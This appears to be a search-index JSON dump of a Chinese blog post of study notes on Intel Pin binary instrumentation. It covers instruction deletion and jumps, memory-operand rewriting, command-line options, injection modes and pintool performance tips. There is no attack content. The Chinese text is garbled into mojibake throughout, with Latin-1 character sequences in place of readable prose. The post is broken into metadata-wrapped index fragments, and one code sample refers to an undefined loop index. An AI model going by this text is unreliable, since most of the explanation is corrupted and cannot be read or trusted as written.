Application Instructions è™½ç„¶Pinçš„ä¸»è¦ç”¨é€”æ˜¯å¯¹äºŒè¿›åˆ¶ç¨‹åºè¿›è¡Œæ’æ¡©ï¼Œä½†æ˜¯å®ƒä¹Ÿå¯ä»¥å®ç°å¯¹ç¨‹åºæŒ‡ä»¤çš„ä¿®æ”¹ã€‚ ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:2:0","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"5.1 å®ç°æ–¹å¼ æœ€ç®€å•çš„å®ç°æ–¹å¼æ˜¯æ’å…¥ä¸€ä¸ªåˆ†æroutineæ¥æ¨¡æ‹ŸæŒ‡ä»¤æ‰§è¡Œï¼Œç„¶åè°ƒç”¨INS_Delete()æ¥åˆ é™¤æŒ‡ä»¤ã€‚ä¹Ÿå¯ä»¥é€šè¿‡ç›´æ¥æˆ–é—´æ¥æ’å…¥ç¨‹åºæ‰§è¡Œæµåˆ†æ”¯ï¼ˆä½¿ç”¨INS_InsertDirectJumpå’ŒINS_InsertIndirectJumpï¼‰å®ç°ï¼Œè¿™ç§æ–¹å¼ä¼šæ”¹å˜ç¨‹åºçš„æ‰§è¡Œæµï¼Œä½†æ˜¯ä¼šæ›´å®¹æ˜“å®ç°æŒ‡ä»¤æ¨¡æ‹Ÿã€‚ INS_InsertDirectJump() å£°æ˜ï¼š VOID INS_InsertDirectJump(INS ins, IPOINT ipoint, ADDRINT tgt) å‚æ•°ï¼š insï¼šè¾“å…¥çš„æŒ‡ä»¤ ipointï¼šä¸insç›¸å…³çš„locationï¼ˆä»…æ”¯æŒIPOINT_BEFOREå’ŒIPOINT_AFTERï¼‰ tgtï¼štargetçš„ç»å¯¹åœ°å€ ä½œç”¨ï¼šæ’å…¥ç›¸å¯¹äºç»™å®šæŒ‡ä»¤çš„ç›´æ¥è·³è½¬æŒ‡ä»¤ï¼Œä¸INS_Delete()é…åˆä½¿ç”¨å¯ä»¥æ¨¡æ‹Ÿæ§åˆ¶æµè½¬ç§»æŒ‡ä»¤ã€‚ INS_InsertIndirectJump() å£°æ˜ï¼š VOID INS_InsertIndirectJump ( INS ins, IPOINT ipoint, REG reg) å‚æ•°ï¼š insï¼šè¾“å…¥çš„æŒ‡ä»¤ ipointï¼šä¸insç›¸å…³çš„locationï¼ˆä»…æ”¯æŒIPOINT_BEFOREå’ŒIPOINT_AFTER regï¼štargetçš„å¯„å­˜å™¨ ä½œç”¨ï¼šæ’å…¥ç›¸å¯¹äºç»™å®šæŒ‡ä»¤çš„é—´æ¥è·³è½¬æŒ‡ä»¤ï¼Œä¸INS_Delete()é…åˆä½¿ç”¨å¯ä»¥æ¨¡æ‹Ÿæ§åˆ¶æµè½¬ç§»æŒ‡ä»¤ã€‚ ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:2:1","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"5.2 æŒ‡ä»¤å†…å­˜ä¿®æ”¹ å¯¹äºåŸå§‹æŒ‡ä»¤ä½¿ç”¨åˆ°çš„å†…å­˜çš„è®¿é—®ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨INS_RewriteMemoryOperandæ¥å¼•ç”¨é€šè¿‡åˆ†æroutineè®¡ç®—å¾—åˆ°çš„å€¼æ¥æ›¿ä»£ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¯¹äºæŒ‡ä»¤çš„ä¿®æ”¹æ“ä½œï¼Œä¼šåœ¨æ‰€æœ‰çš„æŒ‡ä»¤æ’æ¡©æ“ä½œå®Œæˆåè¿›è¡Œï¼Œå› æ­¤åœ¨è¿›è¡ŒæŒ‡ä»¤æ’æ¡©æ—¶ï¼Œæ’æ¡©routineçœ‹åˆ°çš„éƒ½æ˜¯åŸå§‹çš„ã€æ²¡æœ‰ç»è¿‡ä¿®æ”¹çš„ç¨‹åºæŒ‡ä»¤ã€‚ INS_RewriteMemoryOperand() å£°æ˜ï¼š VOID INS_RewriteMemoryOperand(INS ins, UINt32 memindex, REG newBase) å‚æ•°ï¼š insï¼šè¾“å…¥æŒ‡ä»¤ memindexï¼šæ§åˆ¶éœ€è¦é‡å†™çš„å†…å­˜æ“ä½œæ•°ï¼ˆ0ï¼Œ1ï¼Œâ€¦ï¼‰ newBaseï¼šåŒ…å«æ–°æ“ä½œæ•°åœ°å€çš„å¯„å­˜å™¨ï¼Œé€šå¸¸æ˜¯é€šè¿‡PIN_ClainToolRegisteråˆ†é…çš„ä¸´æ—¶å¯„å­˜å™¨ ä½œç”¨ï¼šæ›´æ”¹æ­¤å†…å­˜è®¿é—®æŒ‡ä»¤ä»¥é¥®ç”¨åŒ…å«åœ¨ç»™å®šç‰¹å®šå¯„å­˜å™¨ä¸­çš„è™šæ‹Ÿå†…å­˜åœ°å€ã€‚ åœ¨IA-32å’ŒIntel 64å¹³å°ä¸Šï¼Œä¿®æ”¹åçš„æ“ä½œæ•°ä»…ä½¿ç”¨å…·æœ‰æ–°åŸºå€å¯„å­˜å™¨newBaseçš„åŸºå€å¯„å­˜å™¨è¿›è¡Œå¯»å€ã€‚åŸå§‹æŒ‡ä»¤ä¸­è¯¥æ“ä½œæ•°çš„ä»»ä½•indexï¼Œ scaleæˆ–è€…offset filedéƒ½ä¼šè¢«åˆ é™¤ã€‚ è¯¥å‡½æ•°å¯ä»¥ç”¨äºé‡å†™å†…å­˜æ“ä½œæ•°ï¼ŒåŒ…æ‹¬éšå¼çš„ï¼ˆå¦‚callã€retã€pushã€popï¼‰ï¼Œå”¯ä¸€ä¸èƒ½é‡å†™çš„æŒ‡ä»¤æ˜¯ç¬¬äºŒä¸ªæ“ä½œæ•°å¤§äº0çš„enterã€‚ newBaseä¸­çš„åœ°å€æ˜¯ä¸­æ˜¯è¯¥æ“ä½œæ•°å°†è®¿é—®çš„æœ€ä½åœ°å€ï¼Œå¦‚æœæ“ä½œæ•°åœ¨å†…å­˜è®¿é—®ä¹‹å‰è¢«æŒ‡ä»¤ä¿®æ”¹ï¼Œå¦‚pushï¼Œåˆ™newBaseä¸­çš„å€¼å°†ä¸æ˜¯å †æ ˆæŒ‡é’ˆï¼Œè€Œæ˜¯æŒ‡ä»¤è®¿é—®çš„å†…å­˜åœ°å€ã€‚ ç”¨äºå†…å­˜åœ°å€é‡å†™çš„ä¸€ä¸ªæ ·ä¾‹æ’æ¡©ä»£ç å¦‚ä¸‹ï¼š // æ˜ å°„originalEaåˆ°ä¸€ä¸ªç¿»è¯‘åçš„åœ°å€ static ADDRINT ProcessAddress(ADDRINT originalEa, ADDRINT size, UINT32 access); ... for (UINT32 op = 0; op\u003cINS_MemoryOperandCount(ins); op++) // é¦–å…ˆéå†å†…å­˜æ“ä½œæŒ‡ä»¤è¿›è¡Œè®¡æ•° { UINT32 access = (INS_MemoryOperandIsRead(ins,op) ? 1 : 0) | // åˆ¤æ–­æ˜¯å†…å­˜è¯»è¿˜æ˜¯å†…å­˜å†™ (INS_MemoryOperandIsWritten(ins,op) ? 2 : 0); INS_InsertCall(ins, IPOINT_BEFORE, AFUNPTR(ProcessAddress), IARG_MEMORYOP_EA, op, IARG_MEMORYOP_SIZE, op, IARG_UINT32, access, IARG_RETURN_REGS, REG_INST_G0+i, IARG_END); // åœ¨æŒ‡ä»¤å¤„è¿›è¡Œæ’æ¡© INS_RewriteMemoryOperand(ins, i, REG(REG_INST_G0+i)); // é‡å†™å†…å­˜æŒ‡ä»¤çš„æ“ä½œæ•° } ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:2:2","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"6. Applying a Pintool to an Application å‘½ä»¤è¡Œï¼š pin [pin-option]... -t [toolname] [tool-options]... -- [application] [application-option].. ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:3:0","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"6.1 Pin Cmdline Options å¦‚ä¸‹æ˜¯Pinçš„å‘½ä»¤è¡Œçš„å®Œæ•´optionåˆ—è¡¨ï¼š Option Description -follow_execv ä½¿ç”¨Pinæ‰§è¡Œç”±execvç±»ç³»ç»Ÿè°ƒç”¨äº§ç”Ÿçš„æ‰€æœ‰è¿›ç¨‹ -help å¸®åŠ©ä¿¡æ¯ -pause_tool æš‚åœå¹¶æ‰“å°PIDä»¥å¯ä»¥åœ¨toolåŠ è½½åattachåˆ°debuggerï¼Œå¤„ç†è¿‡ç¨‹åœ¨â€˜nâ€™ç§’åé‡å¯ -logfile æŒ‡å®šlogæ–‡ä»¶çš„åå­—å’Œè·¯å¾„ï¼Œé»˜è®¤è·¯å¾„ä¸ºå½“å‰å·¥ä½œç›®å½•ï¼Œé»˜è®¤æ–‡ä»¶åä¸ºpin.log -unique_logfile æ·»åŠ pidåˆ°logæ–‡ä»¶åä¸­ -error_file æŒ‡å®šerroræ–‡ä»¶çš„åå­—å’Œè·¯å¾„ï¼Œé»˜è®¤è·¯å¾„ä¸ºå½“å‰å·¥ä½œç›®å½•ã€‚å¦‚æœè®¾ç½®äº†erroræ–‡ä»¶ï¼Œåˆ™æ‰€æœ‰erroréƒ½ä¼šå†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œå¹¶ä¸”ä¸ä¼šåœ¨consoleä¸­æ˜¾ç¤ºã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œåˆ™ä¸åˆ›å»ºæ–‡ä»¶ã€‚ -unique_error_file æ·»åŠ pidåˆ°erroræ–‡ä»¶åä¸­ -injection çš„é€‰é¡¹ä¸ºdynamicï¼Œ selfï¼Œ childï¼Œ parentï¼Œåªèƒ½åœ¨UNIXä¸­ä½¿ç”¨ï¼Œè¯¦çœ‹Injectionï¼Œé»˜è®¤ä½¿ç”¨dynamicã€‚ -inline å†…è”ç®€å•çš„åˆ†æroutine -log_inline åœ¨pin.logæ–‡ä»¶ä¸­è®°å½•å“ªäº›åˆ†æroutineè¢«è®¾ç½®æˆäº†å†…è” -cc_memory_size æœ€å¤§ä»£ç ç¼“å­˜ï¼Œå­—èŠ‚ä¸ºå•ä½ã€‚0ä¸ºé»˜è®¤å€¼ï¼Œè¡¨ç¤ºä¸åšé™åˆ¶ã€‚å¿…é¡»è®¾ç½®ä¸ºä»£ç ç¼“å­˜å—å¤§å°çš„å¯¹é½å€æ•°ã€‚ -pid \u003cpid #\u003e ä½¿ç”¨Pinå’ŒPintool attachä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ -pin_memory_range é™åˆ¶Pinåˆ°ä¸€ä¸ªå†…å­˜èŒƒå›´å†…ï¼Œ0x80000000:0x90000000 or size: 0:0x10000000. -restric_memory é˜»æ­¢Pinçš„åŠ¨æ€åŠ è½½å™¨ä½¿ç”¨è¯¥åœ°å€èŒƒå›´ï¼š0x10000000:0x20000000 -pin_memory_size é™åˆ¶Pinå’ŒPintoolå¯ä»¥åŠ¨æ€åˆ†é…çš„å­—èŠ‚æ•°ã€‚Pinåˆ†é…çš„å­—èŠ‚æ•°å®šä¹‰ä¸ºPinåˆ†é…çš„å†…å­˜é¡µæ•°ä¹˜ä»¥é¡µå¤§å°ã€‚ -tool_load_option åŠ è½½æœ‰é™„åŠ æ ‡å¿—çš„toolã€‚ -t æŒ‡å®šåŠ è½½çš„Pintoolã€‚ -t64 \u003c64-bit toolname\u003e æŒ‡å®šé’ˆå¯¹Intel 64æ¶æ„çš„64-bitçš„Pintoolã€‚ -p32 æŒ‡å®šIA-32æ¶æ„ä¸‹çš„Pintool -p64 æŒ‡å®šé’ˆå¯¹Intel 64æ¶æ„çš„Pintool -smc-support æ˜¯å¦å¼€å¯appçš„SMCåŠŸèƒ½ï¼Œ1å¼€å¯ï¼Œ0å…³é—­ã€‚é»˜è®¤å¼€å¯ -smc_strict æ˜¯å¦å¼€å¯åŸºæœ¬å—å†…éƒ¨çš„SMCï¼Œ1å¼€å§‹ï¼Œ0å…³é—­ã€‚é»˜è®¤å…³é—­ -appdebug è°ƒè¯•ç›®æ ‡ç¨‹åºï¼Œç¨‹åºè¿è¡Œåç«‹å³åœ¨debuggerä¸­æ–­ä¸‹ -appdebug_enable å¼€å¯ç›®æ ‡ç¨‹åºè°ƒè¯•åŠŸèƒ½ï¼Œä½†æ˜¯åœ¨ç¨‹åºè¿è¡Œåä¸æš‚åœ -appdebug_silent å½“ç¨‹åºè°ƒè¯•åŠŸèƒ½å¼€å¯æ—¶ï¼ŒPinæ‰“å°æ¶ˆæ¯å‘ŠçŸ¥å¦‚ä½•è¿æ¥å¤–éƒ¨debuggerã€‚ä½†æ˜¯åœ¨-appdebug_connectioné€‰é¡¹å¼€å¯æ—¶ä¸æ‰“å°ã€‚ -appdebug_exclude å½“ç¨‹åºè°ƒè¯•åŠŸèƒ½å¼€å¯ï¼Œå¹¶æŒ‡å®šäº†-follw_execvæ—¶ï¼Œé»˜è®¤åœ¨æ‰€æœ‰å­è¿›ç¨‹ä¸Šå¯ç”¨è°ƒè¯•ã€‚ -appdebug_allow_remote å…è®¸debuggerä¸Pinä¸è¿è¡Œåœ¨åŒä¸€ç³»ç»Ÿä¸Šï¼Œè€Œæ˜¯ä»¥è¿œç¨‹æ–¹å¼è¿›è¡Œè¿æ¥ã€‚æŒ‡å®š -appdebug_connection æ—¶ä¼šå¿½ç•¥è¯¥é€‰é¡¹çš„å€¼ï¼Œå› ä¸º -appdebug_connection æ˜ç¡®æŒ‡å®šäº†è¿è¡Œdebuggerçš„machineã€‚ -appdebug_connection å½“ç¨‹åºå¼€å¯è°ƒè¯•æ—¶ï¼ŒPiné»˜è®¤ä¼šå¼€å¯ä¸€ä¸ªTCPç«¯å£ç­‰å¾…debuggerçš„è¿æ¥ã€‚åœ¨å¼€å¯è¯¥é€‰é¡¹æ—¶ï¼Œä¼šåœ¨debuggerä¸­å¼€å¯ä¸€ä¸ªTCPç«¯å£æ¥ç­‰å¾…Pinçš„è¿æ¥ï¼Œç›¸å½“äºåç½®äº†é»˜è®¤çš„æœºåˆ¶ã€‚è¯¥é€‰é¡¹çš„æ ¼å¼ä¸º\"[ip]:port\"ï¼Œâ€œipâ€ä»¥ç‚¹åè¿›åˆ¶æ ¼å¼è¡¨è¾¾ï¼Œå¦‚æœçœç•¥äº†ipï¼Œåˆ™ä¼šè¿æ¥æœ¬åœ°çš„ç«¯å£ï¼Œç«¯å£å·ä¸ºåè¿›åˆ¶è¡¨ç¤ºã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œdebuggerä¸ºGDBæ—¶ï¼Œä¸ä½¿ç”¨è¯¥é€‰é¡¹ã€‚ -detach_reattach å…è®¸åœ¨probeæ¨¡å¼ä¸‹è¿›è¡Œdetachå’Œreattachï¼Œä»…åœ¨Windowså¹³å°ä¸‹ä½¿ç”¨ã€‚ -debug_instrumented_processes å…è®¸debuggerå¯¹ç»è¿‡æ’æ¡©çš„è¿›ç¨‹è¿›è¡Œattachï¼Œä»…åœ¨Windowså¹³å°ä¸‹ä½¿ç”¨ã€‚ -show_asserts å¥å…¨æ€§æ£€æŸ¥ æ­¤å¤–ï¼Œè¿˜æ”¯æŒå¦‚ä¸‹çš„tool optionsï¼Œå®ƒä»¬éœ€è¦è·Ÿåœ¨toolåå­—åé¢ï¼Œä½†æ˜¯è¦åœ¨--ç¬¦å·å‰ï¼š Option Description -logifle æŒ‡å®šlogæ–‡ä»¶çš„åå­—å’Œè·¯å¾„ï¼Œé»˜è®¤è·¯å¾„ä¸ºå½“å‰å·¥ä½œç›®å½•ï¼Œé»˜è®¤æ–‡ä»¶åä¸ºpintool.log -unique_logfile æ·»åŠ pidåˆ°logæ–‡ä»¶åä¸­ -discard_line_info \u003cmodule_name\u003e å¿½ç•¥ç‰¹å®šæ¨¡å—çš„ä¿¡æ¯ï¼Œæ¨¡å—ååº”è¯¥ä¸ºæ²¡æœ‰è·¯å¾„çš„çŸ­æ–‡ä»¶åï¼Œä¸èƒ½æ˜¯ç¬¦å·é“¾æ¥ -discard_line_info_all å¿½ç•¥æ‰€æœ‰æ¨¡å—çš„ä¿¡æ¯ -help å¸®åŠ©ä¿¡æ¯ -support_jit_api å¯ç”¨æ‰˜ç®¡å¹³å°æ”¯æŒ -short_name ä½¿ç”¨æœ€çŸ­çš„RTNåç§°ã€‚ -symbol_path æŒ‡å®šç”¨åˆ†å·åˆ†éš”çš„è·¯å¾„åˆ—è¡¨ï¼Œç”¨äºæœç´¢ä»¥æŸ¥æ‰¾ç¬¦å·å’Œè¡Œä¿¡æ¯ã€‚ä»…åœ¨Windowså¹³å°ä¸‹ä½¿ç”¨ã€‚ -slow_asserts å¥å…¨æ€§æ£€æŸ¥ ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:3:1","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"6.2 Instrumenting Applications on Intel(R) 64 Architectures IA-32å’ŒIntel(R) 64æ¶æ„çš„Pin kitæ˜¯ä¸€ä¸ªç»„åˆkitï¼Œå‡åŒ…å«32-bitå’Œ64-bitçš„ç‰ˆæœ¬ã€‚è¿™å°±ä¸ºå¤æ‚çš„ç¯å¢ƒæä¾›äº†æé«˜çš„å¯è¿è¡Œæ€§ï¼Œä¾‹å¦‚ä¸€ä¸ªç¨å¾®æœ‰ç‚¹å¤æ‚çš„è¿è¡Œå¦‚ä¸‹ï¼š pin [pin-option]... -t64 \u003c64-bit toolname\u003e -t \u003c32-bit toolname\u003e [tool-options]... -- \u003capplication\u003e [application-option].. éœ€è¦æ³¨æ„çš„æ˜¯ï¼š -t64é€‰é¡¹éœ€è¦ç”¨åœ¨-té€‰é¡¹çš„å‰é¢ å½“-t64å’Œ-tä¸€èµ·ä½¿ç”¨æ—¶ï¼Œ-tåé¢è·Ÿçš„æ—¶32-bitçš„toolã€‚ä¸æ¨èä½¿ç”¨ä¸å¸¦-tçš„-t64ï¼Œå› ä¸ºåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå½“ç»™å®š32-bitåº”ç”¨ç¨‹åºæ—¶ï¼ŒPinå°†åœ¨ä¸åº”ç”¨ä»»ä½•å·¥å…·çš„æƒ…å†µä¸‹è¿è¡Œè¯¥åº”ç”¨ç¨‹åºã€‚ [tool-option]ä¼šåŒæ—¶ä½œç”¨äº64-bitå’Œ32-bitçš„toolï¼Œå¹¶ä¸”å¿…é¡»åœ¨-t \u003c32-bit toolname\u003eåé¢è¿›è¡ŒæŒ‡å®šã€‚ ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:3:2","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"6.3 Injection é€‰é¡¹-injectionä»…åœ¨UNIXå¹³å°ä¸‹å¯ä»¥ä½¿ç”¨ï¼Œè¯¥é€‰é¡¹æ§åˆ¶ç€Pinæ³¨å…¥åˆ°ç›®æ ‡ç¨‹åºè¿›ç¨‹çš„æ–¹å¼ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œå»ºè®®ä½¿ç”¨dynamicæ¨¡å¼ã€‚åœ¨è¯¥æ¨¡å¼ä¸‹ï¼Œä½¿ç”¨çš„æ˜¯å¯¹çˆ¶è¿›ç¨‹æ³¨å…¥çš„æ–¹å¼ï¼Œé™¤éæ˜¯ç³»ç»Ÿå†…æ ¸ä¸æ”¯æŒã€‚å­è¿›ç¨‹æ³¨å…¥æ–¹å¼ä¼šåˆ›å»ºä¸€ä¸ªpinçš„å­è¿›ç¨‹ï¼Œæ‰€ä»¥ä¼šçœ‹åˆ°pinè¿›ç¨‹å’Œç›®æ ‡ç¨‹åºè¿›ç¨‹åŒæ—¶è¿è¡Œã€‚ä½¿ç”¨çˆ¶è¿›ç¨‹æ³¨å…¥æ–¹å¼æ—¶ï¼Œpinè¿›ç¨‹ä¼šåœ¨æ³¨å…¥å®Œæˆåé€€å‡ºï¼Œæ‰€ä»¥ç›¸å¯¹æ¥è¯´æ¯”è¾ƒç¨³å®šã€‚åœ¨ä¸æ”¯æŒçš„å¹³å°ä¸Šä½¿ç”¨çˆ¶è¿›ç¨‹æ³¨å…¥æ–¹å¼å¯èƒ½å‡ºç°æ„æ–™ä¹‹å¤–çš„é—®é¢˜ã€‚ ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:3:3","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"7. Writing a Pintool ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:4:0","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"7.1 Logging Messages from a Pintool Pinæä¾›äº†å°†Pintoolçš„messageså†™å…¥åˆ°æ–‡ä»¶çš„æœºåˆ¶â€”â€”LOG() apiï¼Œåœ¨åˆé€‚çš„è·å–messageçš„ä½ç½®ä½¿ç”¨å³å¯ã€‚é»˜è®¤çš„æ–‡ä»¶åä¸ºpintool.logï¼Œå­˜å‚¨è·¯å¾„ä¸ºå½“å‰å·¥ä½œç›®å½•ï¼Œå¯ä»¥ä½¿ç”¨-logfileé€‰é¡¹æ¥æ”¹å˜logæ–‡ä»¶çš„è·¯å¾„å’Œåå­—ã€‚ LOG( \"Replacing function in \" + IMG_Name(img) + \"\\n\" ); LOG( \"Address = \" + hexstr( RTN_Address(rtn)) + \"\\n\" ); LOG( \"Image ID = \" + decstr( IMG_Id(img) ) + \"\\n\" ); ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:4:1","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"7.2 Performance Considerations When Writing a Pintool Pintoolçš„å¼€å‘è´¨é‡ä¼šå¾ˆå¤§ç¨‹åº¦ä¸Šå†³å®štoolçš„æ€§èƒ½å¦‚ä½•ï¼Œä¾‹å¦‚åœ¨è¿›è¡Œæ’æ¡©æ—¶çš„é€Ÿåº¦é—®é¢˜ã€‚å°†é€šè¿‡ä¸€ä¸ªä¾‹å­æ¥ä»‹ç»ä¸€äº›æé«˜toolæ€§èƒ½çš„æŠ€å·§ã€‚ é¦–å…ˆæ˜¯æ’æ¡©éƒ¨åˆ†ä»£ç ï¼š VOID Instruction(INS ins, void *v) { ... if ( [ins is a branch or a call instruction] ) { INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR) docount2, IARG_INST_PTR, IARG_BRANCH_TARGET_ADDR, IARG_BRANCH_TAKEN, IARG_END); } ... } ç„¶åæ˜¯åˆ†æä»£ç ï¼š VOID docount2( ADDRINT src, ADDRINT dst, INT32 taken ) { if(!taken) return; COUNTER *pedg = Lookup( src,dst ); pedg-\u003e_count++; } è¯¥å·¥å…·çš„ç›®çš„æ˜¯è®¡ç®—æ§åˆ¶æµå›¾ä¸­æ¯ä¸ªæ§åˆ¶æµå˜åŒ–çš„è¾¹ç•Œè¢«éå†çš„é¢‘ç‡ã€‚å·¥ä½œåŸç†å¦‚ä¸‹ï¼šæ’æ¡©ç»„ä»¶é€šè¿‡è°ƒç”¨docount2å¯¹æ¯ä¸ªåˆ†æ”¯è¿›è¡Œæ’æ¡©ã€‚ä¼ å…¥çš„å‚æ•°ä¸ºæºåˆ†æ”¯å’Œç›®æ ‡åˆ†æ”¯ä»¥åŠåˆ†æ”¯æ˜¯å¦è¢«æ‰§è¡Œã€‚æºåˆ†æ”¯å’Œç›®æ ‡åˆ†æ”¯ä»£è¡¨æ¥æ§åˆ¶æµè¾¹ç•Œçš„æºå’Œç›®çš„ã€‚å¦‚æœæ²¡æœ‰æ‰§è¡Œåˆ†æ”¯ï¼Œæ§åˆ¶æµä¸ä¼šå‘ç”Ÿæ”¹å˜ï¼Œå› æ­¤åˆ†æroutineä¼šç«‹å³è¿”å›ã€‚å¦‚æœæ‰§è¡Œäº†åˆ†æ”¯ï¼Œå°±ä½¿ç”¨srcå’Œdstå‚æ•°æ¥æŸ¥æ‰¾ä¸æ­¤è¾¹ç•Œç›¸å…³çš„è®¡æ•°å™¨ï¼Œå¹¶å¢åŠ è®¡æ•°å™¨çš„å€¼ã€‚ Shifting Computation for Analysis to Instrumentation Code åœ¨ä¸€ä¸ªå…¸å‹çš„åº”ç”¨ç¨‹åºä¸­ï¼Œå¤§æ¦‚æ¯5æ¡æŒ‡ä»¤æ„æˆä¸€ä¸ªåˆ†æ”¯ï¼Œåœ¨è¿™äº›æŒ‡ä»¤æ‰§è¡Œæ—¶ä¼šè°ƒç”¨Lookupå‡½æ•°ï¼Œé€ æˆæ€§èƒ½ä¸‹é™ã€‚æˆ‘ä»¬æ€è€ƒè¿™ä¸ªè¿‡ç¨‹å¯ä»¥å‘ç°ï¼Œåœ¨æŒ‡ä»¤æ‰§è¡Œæ—¶ï¼Œæ¯æ¡æŒ‡ä»¤åªä¼šè°ƒç”¨ä¸€æ¬¡æ’æ¡©ä»£ç ï¼Œä½†ä¼šå¤šæ¬¡è°ƒç”¨åˆ†æä»£ç ã€‚æ‰€ä»¥ï¼Œå¯ä»¥æƒ³åŠæ³•å°†è®¡ç®—å·¥ä½œä»åˆ†æä»£ç è½¬ç§»åˆ°æ’æ¡©ä»£ç ï¼Œè¿™æ ·å°±å¯ä»¥é™ä½è°ƒç”¨æ¬¡æ•°ï¼Œä»è€Œæå‡æ€§èƒ½ã€‚ é¦–å…ˆï¼Œå°±å¤§å¤šæ•°åˆ†æ”¯è€Œè¨€ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨Instruction()ä¸­æ‰¾åˆ°ç›®æ ‡åˆ†æ”¯ã€‚å¯¹äºè¿™äº›åˆ†æ”¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨Instruction()å†…éƒ¨è°ƒç”¨Lookup()è€Œä¸æ˜¯docount2()ï¼Œå¯¹äºç›¸å¯¹è¾ƒå°‘çš„é—´æ¥åˆ†æ”¯ï¼Œæˆ‘ä»¬ä»ç„¶éœ€è¦ä½¿ç”¨åŸæ¥çš„æ–¹æ³•ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬å¢åŠ ä¸€ä¸ªæ–°çš„å‡½æ•°docountï¼ŒåŸæ¥çš„docount2å‡½æ•°ä¿æŒä¸å˜ï¼š VOID docount( COUNTER *pedg, INT32 taken ) { if( !taken ) return; pedg-\u003e_count++; } ç›¸åº”åœ°ï¼Œä¿®æ”¹æ’æ¡©å‡½æ•°ï¼š VOID Instruction(INS ins, void *v) { ... if (INS_IsDirectControlFlow(ins)) { COUNTER *pedg = Lookup( INS_Address(ins), INS_DirectControlFlowTargetAddress(ins) ); INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR) docount, IARG_ADDRINT, pedg, IARG_BRANCH_TAKEN, IARG_END); } else { INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR) docount2, IARG_INST_PTR, IARG_BRANCH_TARGET_ADDR, IARG_BRANCH_TAKEN, IARG_END); } ... } åœ¨æ’æ¡©å‡½æ•°å†…éƒ¨æ ¹æ®ä¸åŒçš„æƒ…å†µï¼Œæ‰§è¡Œä¸åŒçš„åˆ†æä»£ç 